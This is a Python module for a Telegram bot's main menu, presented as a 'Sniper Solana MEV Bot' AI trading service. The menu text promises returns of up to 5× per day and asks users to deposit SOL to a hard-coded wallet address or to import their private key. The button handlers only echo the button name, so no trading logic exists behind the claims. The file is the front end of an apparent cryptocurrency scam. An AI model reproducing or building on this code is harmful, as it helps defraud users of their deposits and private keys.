from telebot import types
from sessions import user_sessions

# Button layout and response
def show_main_menu(bot, call):
    chat_id = call.message.chat.id
    pubkey = user_sessions.get(chat_id, {}).get("pubkey", "cbKTm2vT8xqcHZbGDjFo39T1tZjQag4ke7CGLEWd6jm")

    menu_text = f"""
🚀 *Meet Sniper Solana MEV Bot* : Your 24/7 AI Trading Partner on Solana

⚡ Maximize your earnings with 24/7 AI-powered trading and lightning-fast MEV techniques, optimizing your performance on the Solana network.

🔑 *Your Main SOL Wallet*  
`{pubkey}` _(Tap to copy)_

💰 *Balance:* `0.000000 SOL`  
📈 *Profit Potential (per 24 hours):*  
- 2 SOL Deposit: Earn up to 1.5× daily  
- 5 SOL Deposit: Earn up to 2.5× daily  
- 10 SOL Deposit: Earn up to 5× daily  

💡 _Please keep at least 2 SOL into your wallet or import your private key to activate Sniper Solana MEV Bot._
"""

    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        types.InlineKeyboardButton("🚀 Start MEV Sniper", callback_data="StartMEVSniper")
    )
    keyboard.add(
        types.InlineKeyboardButton("📦 Wallet", callback_data="wallet"),
        types.InlineKeyboardButton("📊 Positions", callback_data="Positions")
    )
    keyboard.add(
        types.InlineKeyboardButton("📈 MEV History", callback_data="MEVHistory"),
        types.InlineKeyboardButton("🏆 Leaderboard", callback_data="Leaderboard")
    )
    keyboard.add(
        types.InlineKeyboardButton("🔍 MEV Transactions Tracker", callback_data="MEVTransactionsTracker")
    )
    keyboard.add(
        types.InlineKeyboardButton("ℹ️ Info", callback_data="Info"),
        types.InlineKeyboardButton("👥 Referrals", callback_data="Referrals")
    )
    keyboard.add(
        types.InlineKeyboardButton("💬 Support", url="https://t.me/MorganAronn288"),
        types.InlineKeyboardButton("🔄 Refresh", callback_data="Refresh")
    )

    bot.send_message(call.message.chat.id, menu_text, parse_mode="Markdown", reply_markup=keyboard)

# Callback handler
def handle_main_menu_callback(bot, call):
    button_name = call.data
    bot.send_message(call.message.chat.id, f"This is *{button_name}* button", parse_mode="Markdown")
